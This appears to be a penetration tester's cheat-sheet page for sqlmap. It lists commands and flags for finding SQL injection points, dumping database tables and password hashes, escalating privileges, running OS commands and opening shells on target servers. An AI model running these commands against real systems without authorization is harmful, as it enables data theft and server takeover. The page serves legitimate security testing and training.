# SQLmap

{% hint style="info" %}
**sqlmap** goal is to detect and take advantage of **SQL injection vulnerabilities** in web applications. Once it detects one or more SQL injections on the target host, the user can choose among a variety of options to perform an extensive back-end database management system **fingerprint**, **retrieve** DBMS **session** user and database, **enumerate** users, password hashes, privileges, databases, dump entire or user’s specific DBMS tables/columns, run his own SQL statement, read specific files on the file system and more.
{% endhint %}

{% embed url="https://thedarksource.com/sqlmap-cheat-sheet" %}
SQLMap cheatsheet
{% endembed %}

### Dumping tables

{% embed url="https://rnehra01.github.io/Dumping-tables-using-sqlmap" %}

### Examples

* Target the _http://target.server.com_ URL using the **-u** flag:

```bash
sqlmap -u 'http://target.server.com'
```

* Specify POST requests by specifying the **-data** flag:

```bash
sqlmap -u "http://10.10.155.76/login.php" -method "POST" -data "log_email=cun@gmail.com&log_password=123456&login_button=Login" --dbs
```

* Target a vulnerable parameter in an authenticated session by specifying cookies using the **-cookie** flag:

```bash
sqlmap -u 'http://target.server.com' --cookie='JSESSIONID=09h76qoWC559GH1K7D- SQHx'
```

* Drop all Set-Cookie requests from the target web server using the **-drop-set-cookie** flag:

```bash
sqlmap -u 'http://target.server.com' -r req.txt --drop-set-cookie
```

* Perform in-depth and risky attacks using the **-level** and **-risk** flags:

```bash
sqlmap -u 'http://target.server.com' --data='param1=blah' --level=5 --risk=3
```

* Specify which POST or GET parameter to target using the **-p** flag:

```bash
sqlmap -u 'http://target.server.com' --data='param1=blah&param2=blah' -p param1
```

* Choose a random User-Agent request header using the **–random-agent** flag:

```bash
sqlmap -u 'http://target.server.com' -r req.txt --random-agent
```

* Target a certain database service using the **–dbms** flag:

```bash
sqlmap -u 'http://target.server.com' -r req.txt --dbms Oracle
```

* Read a request (stored via Burpsuite) target the user parameter (and no other parameters), run risky queries, and dump users and passwords:

```bash
sqlmap -r ./req.txt -p user --level=1 --risk=3 --passwords
```

* Attempt privilege escalation on the target database

```bash
sqlmap -r ./req.txt --level=1 --risk=3 --privesc
Run the “whoami” command on the target server.
sqlmap -r ./req.txt --level=1 --risk=3 --os-cmd=whoami
```

Dump everything in the database, but wait one second in-between requests.

```bash
sqlmap -r ./req.txt --level=1 --risk=3 --dump --delay=1
```

### Post-Exploit

* Error-Based SQLi, dump all data from a MSSQL Database :

```bash
sqlmap -r req --technique=E -U <user> --level 5 --risk 3 --tamper=space2comment --dbms=MSSQL -D <db> --dump
```

### Flags

_Here are some useful options for your pillaging pleasure:_&#x20;

`-r req.txt` Specify a request stored in a text file, great for saved requests from BurpSuite.&#x20;

`--force-ssl` Force SQLmap to use SSL or TLS for its requests.&#x20;

`--level=1` only test against the specified parameter, ignore all others.&#x20;

`--risk=3` Run all exploit attempts, even the dangerous ones (could damage database).&#x20;

`--delay` Set a delay in-between requests, great for throttled connections.&#x20;

`--proxy` Set to http://127.0.0.1:8080 to pipe requests through BurpSuite for inspection.&#x20;

`--privesc` Attempt to elevate the privileges of the database service account.&#x20;

`--all` Enumerate everything inside the target database.&#x20;

`--hostname` Print the target database’s hostname.&#x20;

`--passwords` Find and exfiltrate all users and their password hashes or digests.&#x20;

`--dbs` Enumerate all databases accessible via the target webserver.&#x20;

`--comments` Enumerate all found comments inside the database.&#x20;

`--sql-shell` Return a SQL prompt for interaction.&#x20;

`--os-cmd` Attempt to execute a system command.&#x20;

`--os-shell` Attempt to return a command prompt or terminal for interaction.&#x20;

`--reg-read` Read the specified Windows registry key value.&#x20;

`--file-write` Specify a local file to be written to the target server.&#x20;

`--file-dest` Specify the remote destination to write a file to.&#x20;



`--technique=` Specify a letter or letters of BEUSTQ to control the exploit attempts:

* `B` : Boolean-based blind
* `E` : Error-based
* `U` : Union query-based&#x20;
* `S` : Stacked queries&#x20;
* `T` : Time-based blind&#x20;
* `Q` : Inline queries
